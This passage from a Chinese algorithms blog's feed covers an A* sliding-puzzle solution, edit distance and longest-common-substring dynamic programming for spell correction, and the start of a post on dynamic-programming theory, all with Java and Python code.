class="built_in">int</span>(status[i]) - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, status: <span class="built_in">str</span>, g: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        self.status = status</span><br><span class="line">        self.g = g</span><br><span class="line">        self.h = AStar.getH(status)</span><br><span class="line">        self.f = self.g + self.h</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span>(<span class="params">self, other: <span class="string">&quot;AStar&quot;</span></span>) -&gt; bool:</span></span><br><span class="line">        <span class="keyword">return</span> self.f &lt; other.f</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">slidingPuzzle</span>(<span class="params">self, board: List[List[<span class="built_in">int</span>]]</span>) -&gt; int:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># board 压缩成一维数组，记录砖瓦的 neighbor index</span></span><br><span class="line">        neighbor = [[<span class="number">1</span>, <span class="number">3</span>],[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>],[<span class="number">1</span>, <span class="number">5</span>],[<span class="number">0</span>, <span class="number">4</span>],[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>],[<span class="number">2</span>, <span class="number">4</span>]]</span><br><span class="line">        <span class="comment"># 获取 status 操作一次后的所有状态</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">status: <span class="built_in">str</span></span>) -&gt; Generator[str, <span class="keyword">None</span>, <span class="keyword">None</span>]:</span></span><br><span class="line">            s = <span class="built_in">list</span>(status)</span><br><span class="line">            x = s.index(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> neighbor[x]:</span><br><span class="line">                s[x], s[y] = s[y], s[x]</span><br><span class="line">                <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">                s[x], s[y] = s[y], s[x]</span><br><span class="line"></span><br><span class="line">        target = <span class="string">&#x27;123450&#x27;</span></span><br><span class="line">        start = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> i <span class="keyword">in</span> board <span class="keyword">for</span> x <span class="keyword">in</span> i])</span><br><span class="line">        <span class="keyword">if</span> start == target:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        q = [AStar(start, <span class="number">0</span>)]</span><br><span class="line">        visited = <span class="built_in">set</span>(start)</span><br><span class="line">        <span class="keyword">while</span> q:</span><br><span class="line">            node = heapq.heappop(q)</span><br><span class="line">            <span class="keyword">for</span> next_status <span class="keyword">in</span> get(node.status):</span><br><span class="line">                <span class="keyword">if</span> next_status <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                    <span class="keyword">if</span> next_status == target:</span><br><span class="line">                        <span class="keyword">return</span> node.g + <span class="number">1</span></span><br><span class="line">                    heapq.heappush(q, AStar(next_status, node.g + <span class="number">1</span>))</span><br><span class="line">                    visited.add(next_status)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/28/UvuOAae9QGZ2FmN.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;A Star 算法是一种很常用的路径查找和图形遍历算法。利用当前与问题有关的信息作为启发式信息，有效提升查找效率，具有较好的性能和准确度。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>动态规划实战</title>
    <link href="https://speedpromise.github.io/archives/2f0539d8.html"/>
    <id>https://speedpromise.github.io/archives/2f0539d8.html</id>
    <published>2021-09-06T01:55:57.000Z</published>
    <updated>2021-10-28T12:46:14.433Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/09/07/mLQUsPOgKWCtrbn.jpg" style="zoom:50%;" /><p>当你在搜索框中，一不小心输错单词时，搜索引擎会非常智能地检测出你的拼写错误，并且用对应的正确单词来进行搜索。那这个功能是如何实现的呢？</p><span id="more"></span><h3 id="如何量化两个字符串的相似度？"><a href="#如何量化两个字符串的相似度？" class="headerlink" title="如何量化两个字符串的相似度？"></a>如何量化两个字符串的相似度？</h3><p>先来看，如何量化两个字符串之间的相似程度呢？有一个非常著名的量化方法，那就是<strong>编辑距离</strong>（Edit Distance）。指的就是，将一个字符串转化成另一个字符串，需要的最少编辑操作次数（比如增加一个字符、删除一个字符、替换一个字符）。编辑距离越大，说明两个字符串的相似程度越小；相反，编辑距离就越小，说明两个字符串的相似程度越大。对于两个完全相同的字符串来说，编辑距离就是 0。</p><p>根据所包含的编辑操作种类的不同，编辑距离有多种不同的计算方式，比较著名的有<strong>莱文斯坦距离</strong>（Levenshtein distance）和<strong>最长公共子串长度</strong>（Longest common substring length）。其中，莱文斯坦距离允许增加、删除、替换字符这三个编辑操作，最长公共子串长度只允许增加、删除字符这两个编辑操作。</p><p>莱文斯坦距离的大小，表示两个字符串差异的大小；而最长公共子串的大小，表示两个字符串相似程度的大小。</p><p>下图例子中，两个字符串 mitcmu 和 mtacnu 的莱文斯坦距离是 3，最长公共子串长度是 4。</p><img data-src="https://i.loli.net/2021/09/07/R6jMzknfrpBd5JV.jpg" style="zoom:50%;" /><h3 id="如何编程计算莱文斯坦距离？"><a href="#如何编程计算莱文斯坦距离？" class="headerlink" title="如何编程计算莱文斯坦距离？"></a>如何编程计算莱文斯坦距离？</h3><p>这个问题是求把一个字符串变成另一个字符串，需要的最少编辑次数。整个求解过程，涉及多个决策阶段，我们需要依次考察一个字符串中的每个字符，跟另一个字符串中的字符是否匹配，匹配的话如何处理，不匹配的话又如何处理。所以，这个问题符合多阶段决策最优解模型。</p><p>先看下用回溯算法如何解决。</p><p>回溯是一个递归处理的过程。如果 a[i]与 b[j]匹配，我们递归考察 a[i+1]和 b[j+1]。如果 a[i]与 b[j]不匹配，那我们有多种处理方式可选：</p><ul><li>可以删除 a[i]，然后递归考察 a[i+1] 和 b[j]；</li><li>可以删除 b[j]，然后递归考察 a[i] 和 b[j+1]；</li><li>可以在 a[i] 前面添加一个跟 b[j] 相同的字符，然后递归考察 a[i] 和 b[j+1];</li><li>可以在 b[j] 前面添加一个跟 a[i] 相同的字符，然后递归考察 a[i+1] 和 b[j]；</li><li>可以将 a[i] 替换成 b[j]，或者将 b[j] 替换成 a[i]，然后递归考察 a[i+1] 和 b[j+1]。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[] a = <span class="string">&quot;mitcmu&quot;</span>.toCharArray();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[] b = <span class="string">&quot;mtacnu&quot;</span>.toCharArray();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> m = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> minDist = Integer.MAX_VALUE; <span class="comment">// 存储结果</span></span><br><span class="line"><span class="comment">// 调用方式 lwstBT(0, 0, 0);</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">lwstBT</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> edist)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (i == n || j == m) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; n) edist += (n-i);</span><br><span class="line">    <span class="keyword">if</span> (j &lt; m) edist += (m - j);</span><br><span class="line">    <span class="keyword">if</span> (edist &lt; minDist) minDist = edist;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (a[i] == b[j]) &#123; <span class="comment">// 两个字符匹配</span></span><br><span class="line">    lwstBT(i+<span class="number">1</span>, j+<span class="number">1</span>, edist);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// 两个字符不匹配</span></span><br><span class="line">    lwstBT(i + <span class="number">1</span>, j, edist + <span class="number">1</span>); <span class="comment">// 删除a[i]或者b[j]前添加一个字符</span></span><br><span class="line">    lwstBT(i, j + <span class="number">1</span>, edist + <span class="number">1</span>); <span class="comment">// 删除b[j]或者a[i]前添加一个字符</span></span><br><span class="line">    lwstBT(i + <span class="number">1</span>, j + <span class="number">1</span>, edist + <span class="number">1</span>); <span class="comment">// 将a[i]和b[j]替换为相同字符</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据回溯算法的代码实现，我们可以画出递归树，看是否存在重复子问题。如果存在重复子问题，那我们就可以考虑能否用动态规划来解决；如果不存在重复子问题，那回溯就是最好的解决方法。</p><img data-src="https://static001.geekbang.org/resource/image/86/89/864f25506eb3db427377bde7bb4c9589.jpg" style="zoom:50%;" /><p>在递归树中，每个节点代表一个状态，状态包含三个变量 (i, j, edist)，其中，edist 表示处理到 a[i]和 b[j]时，已经执行的编辑操作的次数。</p><p>在递归树中，(i, j) 两个变量重复的节点很多，比如 (3, 2) 和 (2, 3)。对于 (i, j) 相同的节点，我们只需要保留 edist 最小的，继续递归处理就可以了，剩下的节点都可以舍弃。所以，状态就从 (i, j, edist) 变成了 (i, j, min_edist)，其中 min_edist 表示处理到 a[i]和 b[j]，已经执行的最少编辑次数。</p><p>这个例子的状态转移方式相对矩阵最短路径问题要复杂一点：</p><img data-src="https://i.loli.net/2021/09/07/H9xvPDmWbSzs4ER.jpg" style="zoom:50%;" /><p>将状态转移方程写出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果：a[i]!=b[j]，那么：min_edist(i, j)就等于：</span><br><span class="line">min(min_edist(i-<span class="number">1</span>,j)+<span class="number">1</span>, min_edist(i,j-<span class="number">1</span>)+<span class="number">1</span>, min_edist(i-<span class="number">1</span>,j-<span class="number">1</span>)+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">如果：a[i]==b[j]，那么：min_edist(i, j)就等于：</span><br><span class="line">min(min_edist(i-<span class="number">1</span>,j)+<span class="number">1</span>, min_edist(i,j-<span class="number">1</span>)+<span class="number">1</span>，min_edist(i-<span class="number">1</span>,j-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">其中，min表示求三数中的最小值。     </span><br></pre></td></tr></table></figure><p>了解了状态与状态之间的递推关系，我们画出一个二维的状态表，按行依次来填充状态表中的每个值。</p><img data-src="https://i.loli.net/2021/09/07/xLBdvnz43ZDJa6s.jpg" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lwstDP</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n, <span class="keyword">char</span>[] b, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[][] minDist = <span class="keyword">new</span> <span class="keyword">int</span>[n][m];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123; <span class="comment">// 初始化第0行:a[0..0]与b[0..j]的编辑距离</span></span><br><span class="line">    <span class="keyword">if</span> (a[<span class="number">0</span>] == b[j]) minDist[<span class="number">0</span>][j] = j;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (j != <span class="number">0</span>) minDist[<span class="number">0</span>][j] = minDist[<span class="number">0</span>][j-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> minDist[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123; <span class="comment">// 初始化第0列:a[0..i]与b[0..0]的编辑距离</span></span><br><span class="line">    <span class="keyword">if</span> (a[i] == b[<span class="number">0</span>]) minDist[i][<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (i != <span class="number">0</span>) minDist[i][<span class="number">0</span>] = minDist[i-<span class="number">1</span>][<span class="number">0</span>]+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> minDist[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">// 按行填表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; m; ++j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j]) minDist[i][j] = min(</span><br><span class="line">          minDist[i-<span class="number">1</span>][j]+<span class="number">1</span>, minDist[i][j-<span class="number">1</span>]+<span class="number">1</span>, minDist[i-<span class="number">1</span>][j-<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">else</span> minDist[i][j] = min(</span><br><span class="line">          minDist[i-<span class="number">1</span>][j]+<span class="number">1</span>, minDist[i][j-<span class="number">1</span>]+<span class="number">1</span>, minDist[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> minDist[n-<span class="number">1</span>][m-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> minv = Integer.MAX_VALUE;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; minv) minv = x;</span><br><span class="line">  <span class="keyword">if</span> (y &lt; minv) minv = y;</span><br><span class="line">  <span class="keyword">if</span> (z &lt; minv) minv = z;</span><br><span class="line">  <span class="keyword">return</span> minv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何编程计算最长公共子串长度？"><a href="#如何编程计算最长公共子串长度？" class="headerlink" title="如何编程计算最长公共子串长度？"></a>如何编程计算最长公共子串长度？</h3><p>每个状态包括三个变量 (i, j, max_lcs)，max_lcs 表示 a[0…i]和 b[0…j]的最长公共子串长度。</p><p>先来看回溯的处理思路。我们从 a[0]和 b[0]开始，依次考察两个字符串中的字符是否匹配。</p><ul><li>如果 a[i]与 b[j]互相匹配，我们将最大公共子串长度加一，并且继续考察 a[i+1]和 b[j+1]。</li><li>如果 a[i]与 b[j]不匹配，最长公共子串长度不变，这个时候，有两个不同的决策路线：</li><li>删除 a[i]，或者在 b[j]前面加上一个字符 a[i]，然后继续考察 a[i+1]和 b[j]；</li><li>删除 b[j]，或者在 a[i]前面加上一个字符 b[j]，然后继续考察 a[i]和 b[j+1]。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 状态转移方程</span></span><br><span class="line">如果：a[i]==b[j]，那么：max_lcs(i, j)就等于：</span><br><span class="line">max(max_lcs(i-<span class="number">1</span>,j-<span class="number">1</span>)+<span class="number">1</span>, max_lcs(i-<span class="number">1</span>, j), max_lcs(i, j-<span class="number">1</span>))；</span><br><span class="line"></span><br><span class="line">如果：a[i]!=b[j]，那么：max_lcs(i, j)就等于：</span><br><span class="line">max(max_lcs(i-<span class="number">1</span>,j-<span class="number">1</span>), max_lcs(i-<span class="number">1</span>, j), max_lcs(i, j-<span class="number">1</span>))；</span><br><span class="line"></span><br><span class="line">其中max表示求三数中的最大值。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lcs</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n, <span class="keyword">char</span>[] b, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[][] maxlcs = <span class="keyword">new</span> <span class="keyword">int</span>[n][m];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;<span class="comment">//初始化第0行：a[0..0]与b[0..j]的maxlcs</span></span><br><span class="line">    <span class="keyword">if</span> (a[<span class="number">0</span>] == b[j]) maxlcs[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (j != <span class="number">0</span>) maxlcs[<span class="number">0</span>][j] = maxlcs[<span class="number">0</span>][j-<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">else</span> maxlcs[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;<span class="comment">//初始化第0列：a[0..i]与b[0..0]的maxlcs</span></span><br><span class="line">    <span class="keyword">if</span> (a[i] == b[<span class="number">0</span>]) maxlcs[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (i != <span class="number">0</span>) maxlcs[i][<span class="number">0</span>] = maxlcs[i-<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">else</span> maxlcs[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">// 填表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; m; ++j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (a[i] == b[j]) maxlcs[i][j] = max(</span><br><span class="line">          maxlcs[i-<span class="number">1</span>][j], maxlcs[i][j-<span class="number">1</span>], maxlcs[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">else</span> maxlcs[i][j] = max(</span><br><span class="line">          maxlcs[i-<span class="number">1</span>][j], maxlcs[i][j-<span class="number">1</span>], maxlcs[i-<span class="number">1</span>][j-<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxlcs[n-<span class="number">1</span>][m-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> maxv = Integer.MIN_VALUE;</span><br><span class="line">  <span class="keyword">if</span> (x &gt; maxv) maxv = x;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; maxv) maxv = y;</span><br><span class="line">  <span class="keyword">if</span> (z &gt; maxv) maxv = z;</span><br><span class="line">  <span class="keyword">return</span> maxv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解答开篇"><a href="#解答开篇" class="headerlink" title="解答开篇"></a>解答开篇</h3><p>当用户在搜索框内，输入一个拼写错误的单词时，我们就拿这个单词跟词库中的单词一一进行比较，计算编辑距离，将编辑距离最小的单词，作为纠正之后的单词，提示给用户。</p><p>这就是拼写纠错最基本的原理。不过，真正用于商用的搜索引擎，拼写纠错功能显然不会就这么简单。一方面，单纯利用编辑距离来纠错，效果并不一定好；另一方面，词库中的数据量可能很大，搜索引擎每天要支持海量的搜索，所以对纠错的性能要求很高。</p><p>针对纠错效果不好的问题，我们有很多种优化思路，我这里介绍几种。</p><ul><li>我们并不仅仅取出编辑距离最小的那个单词，而是取出编辑距离最小的 TOP 10，然后根据其他参数，决策选择哪个单词作为拼写纠错单词。比如使用搜索热门程度来决定哪个单词作为拼写纠错单词。</li><li>我们还可以用多种编辑距离计算方法，比如今天讲到的两种，然后分别编辑距离最小的 TOP 10，然后求交集，用交集的结果，再继续优化处理。我们还可以通过统计用户的搜索日志，得到最常被拼错的单词列表，以及对应的拼写正确的单词。搜索引擎在拼写纠错的时候，首先在这个最常被拼错单词列表中查找。如果一旦找到，直接返回对应的正确的单词。这样纠错的效果非常好。</li><li>我们还有更加高级一点的做法，引入个性化因素。针对每个用户，维护这个用户特有的搜索喜好，也就是常用的搜索关键词。当用户输入错误的单词的时候，我们首先在这个用户常用的搜索关键词中，计算编辑距离，查找编辑距离最小的单词。</li></ul><p>针对纠错性能方面，我们也有相应的优化方式。我讲两种分治的优化思路。</p><ul><li>如果纠错功能的 TPS 不高，我们可以部署多台机器，每台机器运行一个独立的纠错功能。当有一个纠错请求的时候，我们通过负载均衡，分配到其中一台机器，来计算编辑距离，得到纠错单词。</li><li>如果纠错系统的响应时间太长，也就是，每个纠错请求处理时间过长，我们可以将纠错的词库，分割到很多台机器。当有一个纠错请求的时候，我们就将这个拼写错误的单词，同时发送到这多台机器，让多台机器并行处理，分别得到编辑距离最小的单词，然后再比对合并，最终决定出一个最优的纠错单词。</li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/09/07/mLQUsPOgKWCtrbn.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;当你在搜索框中，一不小心输错单词时，搜索引擎会非常智能地检测出你的拼写错误，并且用对应的正确单词来进行搜索。那这个功能是如何实现的呢？&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>动态规划理论</title>
    <link href="https://speedpromise.github.io/archives/f5510e8e.html"/>
    <id>https://speedpromise.github.io/archives/f5510e8e.html</id>
    <published>2021-09-06T01:55:52.000Z</published>
    <updated>2021-10-28T12:46:14.435Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/09/06/vP3QhA5EgiRsc92.jpg" style="zoom:50%;" /><p>什么样的问题可以用动态规划解决？解决动态规划问题的一般思考过程是什么样的？贪心、分治、回溯、动态规划这四种算法思想又有什么区别和联系？</p><span id="more"></span><h3 id="“一个模型三个特征”理论讲解"><a href="#“一个模型三个特征”理论讲解" class="headerlink" title="“一个模型三个特征”理论讲解"></a>“一个模型三个特征”理论讲解</h3><p>什么是<strong>“一个模型”</strong>？它指的是动态规划适合解决的问题的模型。我把这个模型定义为<strong>“多阶段决策最优解模型”</strong>。</p><p>我们一般是用动态规划来解决最优问题。而解决问题的过程，需要经历多个决策阶段。每个决策阶段都对应着一组状态。然后我们寻找一组决策序列，经过这组决策序列，能够产生最终期望求解的最优值。</p><p>什么是<strong>“三个特征”</strong>？它们分别是<strong>最优子结构、无后效性和重复子问题</strong>。</p><ol><li><strong>最优子结构</strong></li></ol><p>指问题的最优解包含子问题的最优解。也就是说我们可以通过子问题的最优解，推导出问题的最优解。如果我们把最优子结构，对应到我们前面定义的动态规划问题模型上，那我们也可以理解为，后面阶段的状态可以通过前面阶段的状态推导出来。</p><ol start="2"><li><strong>无后效性</strong></li></ol><p>无后效性有两层含义，第一层含义是，在推导后面阶段的状态的时候，我们只关心前面阶段的状态值，不关心这个状态是怎么一步一步推导出来的。第二层含义是，某阶段状态一旦确定，就不受之后阶段的决策影响。无后效性是一个非常“宽松”的要求。只要满足前面提到的动态规划问题模型，其实基本上都会满足无后效性。</p><ol start="3"><li>重复子问题</li></ol><p>不同的决策序列，到达某个相同的阶段时，可能会产生重复的状态。</p><h3 id="“一个模型三个特征”实例剖析"><a href="#“一个模型三个特征”实例剖析" class="headerlink" title="“一个模型三个特征”实例剖析"></a>“一个模型三个特征”实例剖析</h3><p>假设我们有一个 n 乘以 n 的矩阵 w[n][n]。矩阵存储的都是正整数。棋子起始位置在左上角，终止位置在右下角。我们将棋子从左上角移动到右下角。每次只能向右或者向下移动一位。从左上角到右下角，会有很多不同的路径可以走。我们把每条路径经过的数字加起来看作路径的长度。那从左上角移动到右下角的最短路径长度是多少呢？</p><img data-src="https://i.loli.net/2021/09/06/7SkDG8MzWBLE3yo.jpg" style="zoom:50%;" /><p>我们先看看，这个问题是否符合“一个模型”？</p><p>从 (0, 0) 走到 (n-1, n-1)，总共要走 2*(n-1) 步，也就对应着 2*(n-1) 个阶段。每个阶段都有向右走或者向下走两种决策，并且每个阶段都会对应一个状态集合。</p><p>我们把状态定义为 min_dist(i, j)，其中 i 表示行，j 表示列。min_dist 表达式的值表示从 (0, 0) 到达 (i, j) 的最短路径长度。所以，这个问题是一个多阶段决策最优解问题，符合动态规划的模型。</p><img data-src="https://i.loli.net/2021/09/06/sHrlK8AgqpG3LbJ.jpg" style="zoom: 33%;" /><p>我们再来看，这个问题是否符合“三个特征”？</p><p>我们可以用回溯算法来解决这个问题。如果你自己写一下代码，画一下递归树，就会发现，递归树中有重复的节点。重复的节点表示，从左上角到节点对应的位置，有多种路线，这也能说明这个问题中存在重复子问题。</p><img data-src="https://i.loli.net/2021/09/06/Rgj7xYBlyU6V4pF.jpg" style="zoom:50%;" /><p>如果我们走到 (i, j) 这个位置，我们只能通过 (i-1, j)，(i, j-1) 这两个位置移动过来，也就是说，我们想要计算 (i, j) 位置对应的状态，只需要关心 (i-1, j)，(i, j-1) 两个位置对应的状态，并不关心棋子是通过什么样的路线到达这两个位置的。而且，我们仅仅允许往下和往右移动，不允许后退，所以，前面阶段的状态确定之后，不会被后面阶段的决策所改变，所以，这个问题符合“无后效性”这一特征。</p><p>刚刚定义状态的时候，我们把从起始位置 (0, 0) 到 (i, j) 的最小路径，记作 min_dist(i, j)。因为我们只能往右或往下移动，所以，我们只有可能从 (i, j-1) 或者 (i-1, j) 两个位置到达 (i, j)。也就是说，到达 (i, j) 的最短路径要么经过 (i, j-1)，要么经过 (i-1, j)，而且到达 (i, j) 的最短路径肯定包含到达这两个位置的最短路径之一。换句话说就是，min_dist(i, j) 可以通过 min_dist(i, j-1) 和 min_dist(i-1, j) 两个状态推导出来。这就说明，这个问题符合“最优子结构”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">min_dist(i, j) = w[i][j] + min(min_dist(i, j-<span class="number">1</span>), min_dist(i-<span class="number">1</span>, j))</span><br></pre></td></tr></table></figure><h3 id="两种动态规划解题思路总结"><a href="#两种动态规划解题思路总结" class="headerlink" 